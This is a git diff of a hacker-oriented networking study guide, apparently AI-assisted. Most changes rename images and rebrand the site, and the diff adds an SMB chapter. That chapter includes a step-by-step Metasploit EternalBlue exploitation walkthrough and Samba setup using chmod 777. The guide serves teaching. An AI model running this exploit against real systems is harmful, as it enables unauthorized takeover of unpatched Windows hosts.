@@ -49,7 +49,7 @@ Join me as we uncover these essential topics to empower your understanding and s
 
 Internet Protocol addresses (IP addresses) make the world go 'round. Or, at least, enable us to email, Zoom, watch YouTube videos, Tweet, and navigate the web. It's almost as important as the world going around!
 
-<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Each digital device (computer, laptop, phone, tablet, etc.) is assigned an IP address, and this is what enables us to communicate and connect with it. Imagine an IP address as being similar to your house address. Without that address, no one could find you and send you snail mail.
 
@@ -57,7 +57,7 @@ The IP address system we are presently using is known as IP version 4, or IPv4. 
 
 Take, for instance, 192.168.1.101. Each of the numbers between the dots (.) is the decimal equivalent of 8 bits. This means that we calculate the base 2 number (that computers use) represented by the 8 bits and convert them to decimal numbers that humans are more accustomed to working with (see the diagram below). Each one of the octets (8 bits) is capable of representing numbers within the range 0 through 255 (2 to the 8th power).
 
-<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Classes of IP Addresses
 
@@ -143,7 +143,7 @@ When trying to create a new hacking tool or investigate a network attack, unders
 
 ### **What Are Protocols?**
 
-Protocols are simply an agreed-upon way to communicate. For instance, we here on MeowByte have agreed upon the English language with all its rules and grammar as our way to communicate. That is our protocol. If we did not have an agreed-upon way to communicate, people would be using many languages, grammar, and rules, and none of us would understand each other.
+Protocols are simply an agreed-upon way to communicate. For instance, we here on Hackers-Arise have agreed upon the English language with all its rules and grammar as our way to communicate. That is our protocol. If we did not have an agreed-upon way to communicate, people would be using many languages, grammar, and rules, and none of us would understand each other.
 
 Protocols are similar. A protocol simply defines a way of communication with all its rules. These rules are usually defined by an RFC (Request for Comments).
 
@@ -982,7 +982,7 @@ Most systems default to `ACCEPT` for ease of connectivity, though for enhanced s
 
     Example: Use `ifconfig` on Linux or `ipconfig` on Windows to identify wireless interfaces.
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 *   Scan for Access Points (APs):
 
@@ -993,7 +993,7 @@ Most systems default to `ACCEPT` for ease of connectivity, though for enhanced s
 
     Example: Scan for nearby APs using `iwlist scan` on Linux or `netsh wlan show networks mode=BSSID` on Windows.
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Monitor Mode**
 
@@ -1005,7 +1005,7 @@ Most systems default to `ACCEPT` for ease of connectivity, though for enhanced s
 
     Example: Enable monitor mode on `wlan0` interface using `airmon-ng`.
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Capturing Frames**
 
@@ -1017,15 +1017,15 @@ Most systems default to `ACCEPT` for ease of connectivity, though for enhanced s
 
     Example: Capture Wi-Fi traffic on `wlan0` using `airodump-ng`.
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Anatomy of Wi-Fi Frames**
 
 * Analyze frames in Wireshark: Filter for specific frames using expressions like `wlan.fc.type_subtype == 0x08` for beacon frames. Example: Use Wireshark to analyze Wi-Fi frames with filters for beacon frames (`wlan.fc.type_subtype == 0x08`).
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
@@ -1759,13 +1759,9 @@ Metasploit uses ARP for network discovery and exploitation:
 
 ***
 
-Certainly! Let's delve deeper into the chapter on Domain Name Service (DNS), covering how domain names work, DNS functionality, packet-level analysis, vulnerabilities, DNS security, and building a DNS server in Linux. I'll expand on the content, provide examples, commands, and tables where necessary for your exam preparation.
+## Chapter 8: Domain Name Service (DNS)
 
-***
-
-### Chapter 7: Domain Name Service (DNS)
-
-#### Introduction to DNS
+### Introduction to DNS
 
 DNS (Domain Name System) is a critical protocol that translates domain names into IP addresses, making it easier for users to access websites without needing to remember IP addresses.
 
@@ -1777,7 +1773,7 @@ Domain names are structured hierarchically, with each level providing specific i
 * **Second Level Domains (SLDs)**: Directly under TLDs, e.g., hackers-arise.com.
 * **Subdomains**: Further divisions under SLDs, e.g., sales.hackers-arise.com.
 
-#### How DNS Works
+### How DNS Works
 
 DNS operates in a distributed manner with multiple server types:
 
@@ -1790,7 +1786,7 @@ DNS operates in a distributed manner with multiple server types:
 
 DNS uses UDP for queries and responses. The structure of DNS packets includes headers and sections like Query, Answer, Authority, and Additional.
 
-**Example DNS Query Packet (Query)**
+### **Example DNS Query Packet (Query)**
 
 ```
 Query ID: 0x7f71
@@ -1816,7 +1812,7 @@ Additional RRs: 1
 Answer: www.hackers-arise.com IN A 23.236.62.147
 ```
 
-#### Vulnerabilities and Security in DNS
+### Vulnerabilities and Security in DNS
 
 DNS is susceptible to various attacks:
 
@@ -1830,7 +1826,7 @@ DNS is susceptible to various attacks:
 * **`dnstracer`**: Traces the route taken by a DNS query.
 * **`dnsdist`**: DNS proxy with DoS protection and load balancing capabilities.
 
-#### Building Your Own DNS Server in Linux (BIND)
+### Building Your Own DNS Server in Linux (BIND)
 
 BIND (Berkeley Internet Name Domain) is a widely used DNS server on Linux. Here's a basic setup example:
 
@@ -1910,11 +1906,204 @@ sudo systemctl restart bind9
 
 DNS is vital for translating domain names into IP addresses, facilitating internet navigation. Understanding DNS components, security measures like DNSSEC, vulnerabilities, and setting up a DNS server (e.g., BIND) are crucial for network administrators and security professionals.
 
-#### Exercises
+### Exercises
 
 1. Modify DNS configuration to add MX records for email servers.
 2. Perform a DNSSEC setup for a domain using BIND.
 3. Investigate recent CVEs related to DNS vulnerabilities.
+
+***
+
+## Chapter 9: Server Message Block (SMB)
+
+This chapter covers Server Message Block (SMB), a critical yet often misunderstood protocol essential for network functionality and security.
+
+***
+
+### **What is SMB?**
+
+**Server Message Block (SMB)** is an application layer (layer 7) protocol extensively used for sharing files, ports, named pipes, and printers. It operates as a client-server communication protocol, enabling users and applications to share resources over a Local Area Network (LAN). For instance, if one system has a file needed by another system, SMB allows the file to be shared. Additionally, SMB facilitates printer sharing over the LAN and operates over TCP/IP using port 445.
+
+**SMB Characteristics:**
+
+* **Layer**: Application layer (Layer 7)
+* **Port**: 445 (TCP/IP)
+* **Functionality**: File sharing, printer sharing, named pipe sharing, port sharing
+* **Communication Model**: Client-server, request-response
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+Clients connect to servers via TCP/IP or NetBIOS. Once a connection is established, clients can send commands to access shares, read and write files, and use printers. Essentially, SMB allows clients to perform their regular tasks over the network.
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+**History of SMB**
+
+SMB was first developed by IBM in the 1980s and later adopted and adapted by Microsoft for its Windows operating system.
+
+***
+
+### **CIFS: Common Internet File System**
+
+**CIFS (Common Internet File System)** is often confused with SMB. CIFS is a dialect or a specific implementation of the SMB protocol developed by Microsoft for early Windows operating systems. CIFS is now considered obsolete and has been replaced by more modern SMB implementations, such as SMB 2.0 (introduced in 2006 with Windows Vista) and SMB 3.0 (introduced with Windows 8 and Server 2012).
+
+**Evolution of SMB:**
+
+<table><thead><tr><th width="171">Version</th><th width="204">Release Year</th><th>Major Features</th></tr></thead><tbody><tr><td>SMB 1.0</td><td>1980s</td><td>Basic file sharing</td></tr><tr><td>CIFS</td><td>Early 1990s</td><td>Enhanced SMB for early Windows</td></tr><tr><td>SMB 2.0</td><td>2006</td><td>Improved performance, reduced chattiness</td></tr><tr><td>SMB 3.0</td><td>2012</td><td>Enhanced security, better performance, support for larger file sizes</td></tr></tbody></table>
+
+***
+
+### **SMB Vulnerabilities**
+
+SMB, both in Windows and Samba (Linux/Unix), has been a significant source of critical vulnerabilities. Two major Windows vulnerabilities are MS08-067 and EternalBlue, developed by the NSA. These exploits allowed attackers to send specially crafted packets to SMB and execute remote code with system privileges on the target system, effectively taking full control.
+
+**Key Vulnerabilities:**
+
+* **MS08-067**: Allowed remote code execution on Windows systems.
+* **EternalBlue (MS17-010)**: Exploited by ransomware like Petya and WannaCry, allowed attackers to execute code remotely on vulnerable Windows systems.
+
+For a detailed examination of the EternalBlue exploit against Windows 7 using Metasploit, see [this tutorial](https://www.hackers-arise.com/post/2017/06/12/metasploit-basics-part-8-exploitation-with-eternalblue).
+
+Additionally, the Linux/Unix implementation of SMB, known as Samba, has faced significant vulnerabilities. A search for SMB exploits in Metasploit reveals numerous issues, including the infamous MS08-067 and EternalBlue.
+
+For a packet-level analysis of the EternalBlue exploit against SMB on a Windows 7 system, see [this detailed analysis](https://www.hackers-arise.com/post/2018/11/30/network-forensics-part-2-packet-level-analysis-of-the-eternalblue-exploit).
+
+**Detailed Exploitation of SMB Vulnerabilities:**
+
+**MS08-067**:
+
+* **Description**: This vulnerability allows remote code execution if an affected system receives a specially crafted RPC request. It targets the Windows Server service.
+* **Technical Details**:
+  * **Affected Systems**: Windows 2000, Windows XP, Windows Server 2003.
+  * **Attack Vector**: The attacker sends a specially crafted packet to the affected system, exploiting a flaw in the handling of RPC requests.
+  * **Mitigation**: Apply the security patch provided by Microsoft.
+
+**EternalBlue (MS17-010)**:
+
+* **Description**: This exploit targets a vulnerability in the SMBv1 protocol, allowing remote attackers to execute arbitrary code on the target system.
+* **Technical Details**:
+  * **Affected Systems**: Windows XP, Windows Vista, Windows 7, Windows Server 2003, Windows Server 2008.
+  * **Attack Vector**: The attacker sends specially crafted packets to the target system, exploiting a flaw in the SMBv1 protocol.
+  * **Impact**: The attacker can gain complete control over the affected system, leading to data theft, ransomware installation, and other malicious activities.
+  * **Mitigation**: Disable SMBv1 and apply the security patch provided by Microsoft.
+
+**Example: Exploiting EternalBlue with Metasploit**
+
+**Step 1: Set up Metasploit**
+
+```bash
+msfconsole
+```
+
+**Step 2: Search for EternalBlue Exploit**
+
+```bash
+msf > search eternalblue
+```
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+**Step 3: Select the Exploit**
+
+```bash
+msf > use exploit/windows/smb/ms17_010_eternalblue
+```
+
+**Step 4: Set the Required Options**
+
+```bash
+msf exploit(ms17_010_eternalblue) > set RHOST <target_ip>
+msf exploit(ms17_010_eternalblue) > set LHOST <your_ip>
+```
+
+**Step 5: Launch the Exploit**
+
+```bash
+msf exploit(ms17_010_eternalblue) > exploit
+```
+
+**Step 6: Post-Exploitation**
+
+* **Meterpreter Session**: Once the exploit is successful, you will have a Meterpreter session, allowing you to execute commands on the target system.
+
+```bash
+meterpreter > sysinfo
+meterpreter > getuid
+```
+
+***
+
+**Building a Samba Server in Kali Linux**
+
+SMB was initially developed by IBM and later adopted by Microsoft. Samba was created to emulate a Windows server on Linux/UNIX systems, enabling resource sharing with Windows systems.
+
+To better understand SMB, we will install, configure, and implement Samba on a Linux system. Here, we use Kali Linux (based on Debian) for demonstration, but the process should work on any Debian-based system, including Ubuntu and other UNIX-like systems.
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+**Steps to Build a Samba Server:**
+
+1.  **Download and Install Samba**
+
+    ```bash
+    kali > apt-get install samba
+    ```
+2.  **Start Samba**
+
+    ```bash
+    kali > service smbd start
+    ```
+
+    Note: The service name is "smbd" (SMB daemon).
+3.  **Configure Samba** Samba configuration is managed via a text file located at `/etc/samba/smb.conf`. Open it with a text editor:
+
+    ```bash
+    kali > leafpad /etc/samba/smb.conf
+    ```
+
+    Add the following lines to configure your share:
+
+    ```ini
+    [HackersArise_share]
+    comment = Samba on Hackers-Arise
+    path = /home/OTW/HackersArise_share
+    read only = no
+    browsable = yes
+    ```
+4.  **Create a Share** Create the shared directory in the user's home directory:
+
+    ```bash
+    kali > mkdir /home/OTW/HackersArise_share
+    ```
+
+    Change the permissions to allow access to all users:
+
+    ```bash
+    kali > chmod 777 /home/OTW/HackersArise_share
+    ```
+
+    Restart Samba to apply the changes:
+
+    ```bash
+    kali > service smbd restart
+    ```
+5.  **Accessing the Share from Windows** From any Windows machine on the network, access the share using File Explorer by entering the IP address and share name:
+
+    ```
+    \\192.168.1.101\HackersArise_share
+    ```
+
+***
+
+**Summary**
+
+SMB is a crucial protocol for file, port, printer, and named pipe sharing on many computer systems. Despite its importance, it is often poorly understood and appreciated, even by cybersecurity professionals. However, its vulnerabilities, exemplified by MS08-067 and EternalBlue, highlight the need for a thorough understanding to protect systems from attacks.
+
+**Exercises**
+
+1. Build a SAMBA server for your domain.
 
 ***
 
